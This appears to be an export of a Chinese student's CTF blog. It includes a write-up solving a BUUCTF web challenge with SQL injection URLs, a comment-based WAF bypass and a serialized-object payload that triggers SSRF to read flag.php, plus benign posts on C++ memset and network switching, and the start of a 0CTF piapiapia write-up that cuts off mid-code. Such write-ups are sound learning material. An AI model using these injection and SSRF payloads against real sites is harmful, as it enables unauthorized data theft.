class="line">&#125;</span><br></pre></td></tr></table></figure><p>对该文件分析可以发现存在SSRF利用点，其他的暂时没想起来。然后看一下/view.php<br>注意url，穿了个参数。。maybe注入？<br>给个-1试试：报错。把绝对路径爆出来了：/var/www/html/view.php<br>再查查试试：-1 union select 1,2,3 给waf了 过滤了啥不知道 挨个试试，应该是过滤了 union select,把空格换成注释绕过。union/<strong>/select成功绕过。<br>接下来就是判断列数，查数据库名，查表名，查字段。。<br><a href="http://7f8c0885-83d5-462e-b56a-175f6b06308b.node3.buuoj.cn/view.php?no=-1%20union/">http://7f8c0885-83d5-462e-b56a-175f6b06308b.node3.buuoj.cn/view.php?no=-1%20union/</a></strong>/select%201,group_concat(column_name),3,4%20from%20information_schema.columns%20where%20table_name=%27users%27 这是查字段<br>然后查data字段 <a href="http://7f8c0885-83d5-462e-b56a-175f6b06308b.node3.buuoj.cn/view.php?no=-1%20union/**/select%201,group_concat(data),3,4%20from%20users">http://7f8c0885-83d5-462e-b56a-175f6b06308b.node3.buuoj.cn/view.php?no=-1%20union/**/select%201,group_concat(data),3,4%20from%20users</a><br>发现数据是O:8:”UserInfo”:3:{s:4:”name”;s:6:”123123”;s:3:”age”;i:123123;s:4:”blog”;s:13:”<a href="http://www.baidu.com&quot;;}/">www.baidu.com&quot;;}</a><br>眼熟不？序列化后的数据？是不是该想想反序列化的问题了？<br>然后读备份的代码，我们应该利用getBlogContents（）方法进行SSRF,内容为file://var/www/html/flag.php，那么注册的时候能填这个不？当然过滤了。<br>所以，我们猜测，完整的流程应该是这样：<br>用户注册http开头的blog，把对象序列化后存入数据库，当用户查询的时候，查询到序列化数据反序列化，然后交给getBlogContents（）方法去用curl发送请求。<br>我们要做的就是让数据库查到的请求返回的是我们恶意构造的序列化对象，该对象的blog为file:///var/www/html/flag.php。<br>就是要把 O:8:”UserInfo”:3:{s:4:”name”;s:3:”123”;s:3:”age”;i:0;s:4:”blog”;s:29:”file:///var/www/html/flag.php”;} 这一串当作查询返回的结果，应该怎么办呢？UNION SELECT！<br>注意与列对应（根据我们刚才查的列，知道data是第四个字段，所以把payload放到第四个字段上对应~）<br>payload:<a href="http://7f8c0885-83d5-462e-b56a-175f6b06308b.node3.buuoj.cn/view.php?no=-1/**/union/**/select/**/1,2,3,%27O:8:%22UserInfo%22:3:%7Bs:4:%22name%22;s:4:%22test%22;s:3:%22age%22;i:123;s:4:%22blog%22;s:29:%22file:///var/www/html/flag.php%22;%7D%27">http://7f8c0885-83d5-462e-b56a-175f6b06308b.node3.buuoj.cn/view.php?no=-1/**/union/**/select/**/1,2,3,%27O:8:%22UserInfo%22:3:{s:4:%22name%22;s:4:%22test%22;s:3:%22age%22;i:123;s:4:%22blog%22;s:29:%22file:///var/www/html/flag.php%22;}%27</a><br>然后查看源码中的iframe，解密base64得到flag。</p><h2 id="在上帝视角再看这道题"><a href="#在上帝视角再看这道题" class="headerlink" title="在上帝视角再看这道题"></a>在上帝视角再看这道题</h2><p>为了证明我的思路是正确的，我利用SSRF漏洞获取到了db.php,user.php,show,php,join.ok.php<br>下面是view.php的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> session_start(); <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">require_once</span> <span class="string">&#x27;db.php&#x27;</span>; <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">require_once</span> <span class="string">&#x27;user.php&#x27;</span>; <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">require_once</span> <span class="string">&#x27;error.php&#x27;</span>; <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> DB();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;ko&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span></span><br><span class="line">          content=<span class="string">&quot;width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;ie=edge&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;User&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">require_once</span> <span class="string">&#x27;bootstrap.php&#x27;</span>; <span class="meta">?&gt;</span></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$no</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;no&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$db</span>-&gt;anti_sqli(<span class="variable">$no</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no hack ~_~&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$db</span>-&gt;getUserByNo(<span class="variable">$no</span>);</span><br><span class="line"><span class="variable">$user</span> = unserialize(<span class="variable">$res</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"><span class="comment">//print_r($res);</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;div class=&quot;container&quot;&gt;</span><br><span class="line">    &lt;table class=&quot;table&quot;&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;th&gt;</span><br><span class="line">                username</span><br><span class="line">            &lt;/th&gt;</span><br><span class="line">            &lt;th&gt;</span><br><span class="line">                age</span><br><span class="line">            &lt;/th&gt;</span><br><span class="line">            &lt;th&gt;</span><br><span class="line">                blog</span><br><span class="line">            &lt;/th&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td&gt;</span><br><span class="line">                <span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$res</span>[<span class="string">&#x27;username&#x27;</span>]; <span class="meta">?&gt;</span></span><br><span class="line">            &lt;/td&gt;</span><br><span class="line">            &lt;td&gt;</span><br><span class="line">                <span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$user</span>-&gt;age; <span class="meta">?&gt;</span></span><br><span class="line">            &lt;/td&gt;</span><br><span class="line">            &lt;td&gt;</span><br><span class="line">                <span class="meta">&lt;?php</span> <span class="keyword">echo</span> xss(<span class="variable">$user</span>-&gt;blog); <span class="meta">?&gt;</span></span><br><span class="line">            &lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">    &lt;/table&gt;</span><br><span class="line"></span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">    &lt;p&gt;the contents of his/her blog&lt;/p&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$response</span> = <span class="variable">$user</span>-&gt;getBlogContents();</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$response</span> === <span class="number">404</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;404 Not found&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$base64</span> = base64_encode(<span class="variable">$response</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;iframe width=&#x27;100%&#x27; height=&#x27;10em&#x27; src=&#x27;data:text/html;base64,<span class="subst">&#123;$base64&#125;</span>&#x27;&gt;&quot;</span>;</span><br><span class="line">        <span class="comment">// echo $response;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// var_dump($user-&gt;getBlogContents());</span></span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>其中，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$res</span> = <span class="variable">$db</span>-&gt;getUserByNo(<span class="variable">$no</span>);</span><br><span class="line"><span class="variable">$user</span> = unserialize(<span class="variable">$res</span>[<span class="string">&#x27;data&#x27;</span>]);<span class="comment">//这句话也解释了为什么要对应第四个字段。</span></span><br></pre></td></tr></table></figure><p>这两句话印证了我的思路：反序列化数据库中的data字段—存放的user，反序列化后调用getBlogContents()，在getBlogContents()中调用get(user-&gt;blog)，在这里面CURL请求，然后在前端输出base64加密的值。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>我太菜了。综合利用还是不行，说明我每个点还没都弄明白。尤其是正则表达式，只能看个大概，复杂的就不懂了，还需要继续学习</p>]]></content>
      
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>c++ memset</title>
      <link href="2020/04/20/c-memset/"/>
      <url>2020/04/20/c-memset/</url>
      
        <content type="html"><![CDATA[<p>最近一直在做动态规划有关的问题，并且经常性的需要把dp数组置为0，就经常性的用memset(dp,0,sizeof(dp))这么写。。直到今天。<br>今天遇到了一道题 需要把dp数组初始化为1，我就像往常一样写了memset(dp,1,sizeof(dp))，但是整体代码写完后怎么都不对 然后输出一看一串奇怪的数字16843009。。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">10</span>];</span><br><span class="line"><span class="built_in">memset</span>(a,<span class="number">1</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(a));</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">cout&lt;&lt;a[i]&lt;&lt;<span class="string">&quot; &quot;</span>; </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>what happened?<br>首先要知道memset在哪，在string.h头文件里面。<br>memset是按字节赋值，int4字节，memset(dp,1,sizeof(dp))这句话的意思就是把每个int型的dp的每个字节都赋值为00000001，那么每个int型dp元素的值为：<br>00000001 00000001 00000001 00000001，转换成十进制就是16843009。那为什么赋值0或者-1没错？<br>因为0的补码是00000000，-1的补码是11111111，再翻译回去还是0和-1。所以除了0和-1赋值的话可以用fill。<br>比如fill(a,a+n,1)这样就可以把数组a的每一个元素的值都赋值为1了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> c++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二层交换and三层交换</title>
      <link href="2020/04/20/%E4%BA%8C%E5%B1%82%E4%BA%A4%E6%8D%A2and%E4%B8%89%E5%B1%82%E4%BA%A4%E6%8D%A2/"/>
      <url>2020/04/20/%E4%BA%8C%E5%B1%82%E4%BA%A4%E6%8D%A2and%E4%B8%89%E5%B1%82%E4%BA%A4%E6%8D%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="二层交换与三层交换的问题其实是偶然看到的，看某校夏令营经验贴看到有提问这个问题，正好我不会，记录一下。"><a href="#二层交换与三层交换的问题其实是偶然看到的，看某校夏令营经验贴看到有提问这个问题，正好我不会，记录一下。" class="headerlink" title="二层交换与三层交换的问题其实是偶然看到的，看某校夏令营经验贴看到有提问这个问题，正好我不会，记录一下。"></a>二层交换与三层交换的问题其实是偶然看到的，看某校夏令营经验贴看到有提问这个问题，正好我不会，记录一下。</h1><p>参考链接：<br><a href="https://zhuanlan.zhihu.com/p/64455461">https://zhuanlan.zhihu.com/p/64455461</a><br><a href="https://blog.csdn.net/Apollon_krj/article/details/82086174">https://blog.csdn.net/Apollon_krj/article/details/82086174</a><br><a href="https://blog.csdn.net/lycb_gz/article/details/8780851">https://blog.csdn.net/lycb_gz/article/details/8780851</a><br>二层交换机工作在数据链路层，根据MAC地址对帧进行转发；<br>三层交换机工作在网络层，对于跨网段的通信，可以做到一次路由，多次交换。</p><h2 id="用到的知识点"><a href="#用到的知识点" class="headerlink" title="用到的知识点"></a>用到的知识点</h2><p>在说二三层转发之前先总结一下用到的知识点，虽然我学过一遍计算机网络，但自认为学的很菜。。有些地方都忘了。。甚至某协议首部某字段还没记住23333<br>1.ARP<br>ARP协议是由IP地址获得MAC地址，假设两台主机在同一网段，A向B发消息，A知道B的IP地址 但是不知道B的mac地址，所以在局域网内发个广播，目的MAC全为F，意思就是：“谁的IP地址为192.168.2.2？赶紧把mac地址告诉我”<br>局域网内其他主机看到这条消息后发现目的ip不是自己的，于是丢弃；B看到后发现是找的自己，于是把自己的mac地址发给了A，于此同时B在自己的ARP表中记录下A的IP与MAC地址的映射关系。<br>A收到B发的消息后也把B的IP与MAC的映射关系记录到自己的ARP表中。。这就是一次简单的ARP请求<br>2.跨网段通信<br>假设A和B不在一个网段，通信过程应该是这样：<br>先和子网掩码相与，发现不在一个网段，然后找自己的网关，把数据发给网关让网关代为转发；在这个过程中如果不知道网关的MAC就来一次ARP。发送给网关后，查一下路由表，看看下一跳该发到哪了，就这样一直转发，查找下一跳，转发。。无限套娃。套到最后节点，发现目的IP在自己的网段，先看看ARP表有没有记录，没有的话发一次ARP请求，有的话就直接把请求发给目的IP了。<br>3.ARP表 mac表<br>二层交换机维护MAC表，主机维护ARP表</p><h2 id="二层交换"><a href="#二层交换" class="headerlink" title="二层交换"></a>二层交换</h2><p>二层交换是数据链路层的交换，根据mac地址交换。二层交换通信不能跨网段（比如vlan）。<br>二层交换机维护的MAC表是端口和MAC地址的映射关系。</p><h2 id="三层交换"><a href="#三层交换" class="headerlink" title="三层交换"></a>三层交换</h2><p>三层交换又被叫做一次路由，多次交换。<br>这是啥意思？<br>先说一个简单的：<br>假设一台三层交换机划分了vlan1和vlan2，a在vlan1，b在vlan2，a第一次给b发数据的时候还是正常走路由表，等整个过程结束后三层交换机会记录下一条数据，包括了A和B的mac地址端口等相关信息，下次A和B通信的时候直接根据这条数据通过二层转发了，就不用再走路由了。<br>of course,事情没有那么简单，too simple,sometimes naive!<br>上面这句话就图一乐，就像面试问TCP 三次握手的时候你说“客户端发请求，服务器响应，客户端再发一个请求，建立连接。”一样，太不专业了。<br>好的 接下来说个复杂的。</p><h2 id="三层交换跨网段通信"><a href="#三层交换跨网段通信" class="headerlink" title="三层交换跨网段通信"></a>三层交换跨网段通信</h2><p>主机A和B在同一个交换机，但是在不同vlan。观察a和b的通信过程<br>初始化，a发现b和自己不一个网段并且不知道网关的mac，广播一个ARP，目的是找到网关的MAC。<br>网关收到ARP请求后把自己的mac地址发给a，并且在自己的arp表中记录a端口和mac的映射关系。<br>然后把A的IP地址（作为“目的IP地址”）、MAC地址（作为“下一跳MAC地址”），以及与交换机直接相连的端口号等信息下发到三层交换机ASIC芯片中的三层硬件转发表。此时在三层硬件转发表中就有了第一个转发表项，即A的转发表项。<br>A收到网关的应答后，把目的地址修改问网关的mac，并且把数据包发给网关<br>网关收到请求后，先在三层硬件转发表中查找与B有关表项，由于是第一次通信，所以没有，然后进行路由。<br>CPU根据目的地址在router table中查找next hop，发现了直连的主机b，然后在自己的arp表中查b的mac，没有查到，于是发个广播：找B的mac。<br>B收到ARP请求后把自己的mac发给交换机，自己也缓存下。<br>交换机收到b的mac后，在自己的arp表中记录下ip与mac的映射；在三层硬件转发表中新增一项： B的IP地址、MAC地址、进入交换机的端口号等信息。<br>这样就完成了第一次A和B的通信，三层交换机的硬件转发表中多了两项：分别是<br>A的IP A的port A的mac A的vlan 。。。<br>B的IP B的PORT B的MAC B的VLAN 。。。<br>等下次有别的主机想和A或者B通信的时候，由于表中有记录，直接走表中记录的端口转发过去就可以了。<br>即 一次路由，多次交换~（首尾呼应2333</p><h2 id="arp全0和全f的问题"><a href="#arp全0和全f的问题" class="headerlink" title="arp全0和全f的问题"></a>arp全0和全f的问题</h2><p>在网络层的ARP协议（TCP/IP模型）不知道目的mac，所以把目的mac置0；到了数据链路层置为全F 意为广播帧–数据链路层不认识ip。<br>如果有错误欢迎提出，共同进步</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php unserialize</title>
      <link href="2020/04/17/php-unserialize/"/>
      <url>2020/04/17/php-unserialize/</url>
      
        <content type="html"><![CDATA[<h2 id="php-unserialize"><a href="#php-unserialize" class="headerlink" title="php unserialize"></a>php unserialize</h2><p>之前没怎么接触过PHP反序列化的问题，这两天碰巧做了一道往年的题，遇到了，算是初步了解了PHP反序列化的问题，记录一下解决思路<br>题目链接：<a href="https://buuoj.cn/login?next=/challenges?#%5B0CTF%202016%5Dpiapiapia">https://buuoj.cn/login?next=%2Fchallenges%3F#%5B0CTF%202016%5Dpiapiapia</a></p><h2 id="环境探测"><a href="#环境探测" class="headerlink" title="环境探测"></a>环境探测</h2><p>PHP版本5.6 没有发现其他有用信息<br>用扫描器扫了一下发现了网站备份，下载下来。</p><img src="http://cdn.polowong.top/static/images/uns1.jpg"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">class</span>.php</span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span> <span class="keyword">extends</span> <span class="title">mysql</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$table</span> = <span class="string">&#x27;users&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">is_exists</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">parent</span>::select(<span class="keyword">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);</span><br><span class="line"><span class="variable">$password</span> = <span class="built_in">parent</span>::filter(<span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$key_list</span> = <span class="keyword">Array</span>(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;password&#x27;</span>);</span><br><span class="line"><span class="variable">$value_list</span> = <span class="keyword">Array</span>(<span class="variable">$username</span>, md5(<span class="variable">$password</span>));</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">parent</span>::insert(<span class="keyword">$this</span>-&gt;table, <span class="variable">$key_list</span>, <span class="variable">$value_list</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);</span><br><span class="line"><span class="variable">$password</span> = <span class="built_in">parent</span>::filter(<span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$object</span> = <span class="built_in">parent</span>::select(<span class="keyword">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$object</span> &amp;&amp; <span class="variable">$object</span>-&gt;password === md5(<span class="variable">$password</span>)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show_profile</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$object</span> = <span class="built_in">parent</span>::select(<span class="keyword">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$object</span>-&gt;profile;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$new_profile</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);</span><br><span class="line"><span class="variable">$new_profile</span> = <span class="built_in">parent</span>::filter(<span class="variable">$new_profile</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">&#x27;profile&#x27;</span>, <span class="variable">$new_profile</span>, <span class="variable">$where</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">__class__</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mysql</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$link</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"><span class="variable">$config</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;link = mysql_connect(</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;hostname&#x27;</span>],</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;username&#x27;</span>], </span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">);</span><br><span class="line">mysql_select_db(<span class="variable">$config</span>[<span class="string">&#x27;database&#x27;</span>]);</span><br><span class="line">mysql_query(<span class="string">&quot;SET sql_mode=&#x27;strict_all_tables&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;link;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$where</span>, <span class="variable">$ret</span> = <span class="string">&#x27;*&#x27;</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT <span class="subst">$ret</span> FROM <span class="subst">$table</span> WHERE <span class="subst">$where</span>&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>, <span class="keyword">$this</span>-&gt;link);</span><br><span class="line"><span class="keyword">return</span> mysql_fetch_object(<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$key_list</span>, <span class="variable">$value_list</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$key</span> = implode(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$key_list</span>);</span><br><span class="line"><span class="variable">$value</span> = <span class="string">&#x27;\&#x27;&#x27;</span> . implode(<span class="string">&#x27;\&#x27;,\&#x27;&#x27;</span>, <span class="variable">$value_list</span>) . <span class="string">&#x27;\&#x27;&#x27;</span>; </span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO <span 